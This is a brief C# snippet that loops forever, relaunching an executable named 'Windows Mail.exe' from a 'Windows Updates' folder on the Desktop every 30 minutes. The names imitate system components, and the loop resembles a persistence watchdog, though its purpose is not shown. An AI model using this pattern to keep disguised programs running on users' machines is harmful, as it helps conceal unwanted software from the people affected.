using System;
using System.Diagnostics;

// ...

while (true)
{
    Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop", "Windows Updates", "Windows Mail.exe"))?.Dispose();
    System.Threading.Thread.Sleep(1800000); // sleep for 30 minutes
}
